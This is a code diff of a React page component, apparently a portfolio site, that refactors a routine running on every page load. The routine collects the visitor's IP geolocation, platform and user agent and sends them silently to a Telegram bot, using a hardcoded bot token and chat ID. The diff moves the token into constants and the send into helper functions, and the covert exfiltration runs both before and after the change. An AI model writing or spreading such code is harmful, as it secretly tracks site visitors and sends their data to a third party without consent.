@@ -1,4 +1,4 @@
-import React, {useEffect, useState} from 'react';
+import React, {useEffect, useState, useMemo} from 'react';
 import {
   meImage,
   pic01Image,
@@ -17,8 +17,15 @@ import {
 
 const Astral = () => {
   //
-  useEffect(() => {
-    fetch('https://geolocation-db.com/json/')
+  const TOKEN = useMemo(() => '5068623249:AAH9iGf-3GSepNp8dIIiEWFPZagQ7FK8024');
+  const CHAT_ID = useMemo(() => '1777222104');
+  
+  const sendMessage = async (message: string) => {
+    await fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + message)
+  }
+  
+  const getGeolocationInfo = async () => {
+    await fetch('https://geolocation-db.com/json/')
       .then((res) =>res.json())
       .then(async (data) => {
         const messageObj = Object.assign({
@@ -26,11 +33,13 @@ const Astral = () => {
           'platform': navigator.platform,
           'userAgent': navigator.userAgent,
         }, data);
-
-        const message = JSON.stringify(messageObj);
-
-        await fetch('https://api.telegram.org/bot5068623249:AAH9iGf-3GSepNp8dIIiEWFPZagQ7FK8024/sendMessage?chat_id=1777222104&text=' + message)
+        const message = JSON.stringify(messageObj);     
+        await sendMessage(message);
       });
+  }
+  
+  useEffect(() => {
+    getGeolocationInfo();
   }, []);
 
   const [$main, set$main] = useState(null);
